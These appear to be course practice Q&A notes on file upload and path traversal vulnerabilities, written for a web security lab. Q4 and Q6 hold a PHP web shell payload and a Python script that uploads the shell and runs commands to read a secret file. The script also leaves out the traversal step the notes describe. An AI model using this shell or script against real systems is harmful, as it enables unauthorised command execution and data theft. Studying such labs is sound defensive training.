---
course: Web Security
topic: File Upload Vulnerabilities
tags: [web-security]
---

## Practice Questions & Answers

**Q1. Explain how path traversal vulnerabilities can be exploited in the context of file upload functionalities.**

Path traversal vulnerabilities occur when an application does not properly validate input that specifies a file path. An attacker can manipulate this input to traverse directories and access or modify files outside the intended directory. In the context of file upload functionalities, an attacker can use path traversal to upload a file to a sensitive directory where the server might execute the file. For example, in the lab, the attacker used `../` to navigate to the `/files` directory, bypassing restrictions on the `/avatars` directory.

**Q2. How can you ensure that a web application is protected against path traversal attacks?**

To protect against path traversal attacks, developers should:

1. **Validate Input**: Ensure that user-supplied input is validated to prevent directory traversal sequences like `../`.
2. **Whitelist Directory Access**: Restrict file operations to specific directories and deny access to parent directories.
3. **Use Safe File Operations**: Utilize functions that automatically handle path sanitization and avoid direct manipulation of file paths.
4. **Least Privilege Principle**: Run the web application with minimal privileges to limit the damage if an attack succeeds.

For example, the application could enforce a whitelist of allowed directories and reject any attempts to access directories outside this list.

**Q3. Why is it important to disable file execution in certain directories for file uploads?**

Disabling file execution in directories where user uploads are stored prevents attackers from uploading and executing malicious scripts. This mitigates risks associated with file upload vulnerabilities such as web shells. In the lab, the `/avatars` directory had execution disabled, but the `/files` directory did not, allowing the attacker to execute a PHP web shell.

**Q4. How would you exploit a path traversal vulnerability to upload a web shell and execute arbitrary commands?**

To exploit a path traversal vulnerability, follow these steps:

1. Identify a file upload feature in the application.
2. Craft a payload that includes a web shell (e.g., a PHP script).
3. Use path traversal techniques (e.g., `../`) to upload the web shell to a directory where it can be executed.
4. Execute the web shell by accessing its URL and passing commands through GET parameters.

Example payload:
```php
<?php system($_GET['cmd']); ?>
```

Upload this payload to a directory where execution is allowed, and then access it via a URL like:
```
http://example.com/files/test.php?cmd=id
```

**Q5. What is the role of CSRF tokens in securing web applications, and why are they necessary in authenticated exploits?**

CSRF tokens are used to prevent Cross-Site Request Forgery (CSRF) attacks, where an attacker tricks a victim into performing unintended actions on a web application. They ensure that requests are legitimate and originate from the expected source. In authenticated exploits, CSRF tokens are necessary because they add an additional layer of security, requiring the attacker to obtain and include a valid CSRF token in their requests. This makes it harder for the attacker to perform actions on behalf of the authenticated user.

**Q6. How can you automate the exploitation of a file upload vulnerability using Python?**

To automate the exploitation of a file upload vulnerability using Python, you can use the `requests` library to send HTTP requests. Here’s an example script:

```python
import requests
from bs4 import BeautifulSoup
import random
import string

def get_csrf_token(session, url):
    response = session.get(url)
    soup = BeautifulSoup(response.text, 'html.parser')
    csrf_token = soup.find('input', {'name': 'csrf'})['value']
    return csrf_token

def exploit_file_upload(base_url):
    session = requests.Session()

    # Login
    login_url = f"{base_url}/login"
    csrf_token = get_csrf_token(session, login_url)
    login_data = {
        'csrf': csrf_token,
        'username': 'your_username',
        'password': 'your_password'
    }
    session.post(login_url, data=login_data)

    # Upload web shell
    upload_url = f"{base_url}/my_account/avatar"
    csrf_token = get_csrf_token(session, f"{base_url}/my_account")
    web_shell = "<?php system($_GET['cmd']); ?>"
    filename = ''.join(random.choices(string.ascii_letters + string.digits, k=16)) + ".php"
    files = {
        'avatar': (filename, web_shell, 'application/octet-stream'),
        'user': ('your_username'),
        'csrf': (csrf_token)
    }
    session.post(upload_url, files=files)

    # Execute web shell
    cmd_url = f"{base_url}/files/{filename}?cmd=cat%20/home/carlos/secret"
    response = session.get(cmd_url)
    print(response.text)

if __name__ == "__main__":
    base_url = "http://example.com"
    exploit_file_upload(base_url)
```

This script logs in, uploads a web shell, and executes it to retrieve the contents of a secret file.

---
<!-- nav -->
[[06-Understanding CSRF Tokens and File Upload Vulnerabilities|Understanding CSRF Tokens and File Upload Vulnerabilities]] | [[Web Security (PortSwigger)/18-File Upload Vulnerabilities/04-Lab 3 Web shell upload via path traversal/00-Overview|Overview]]
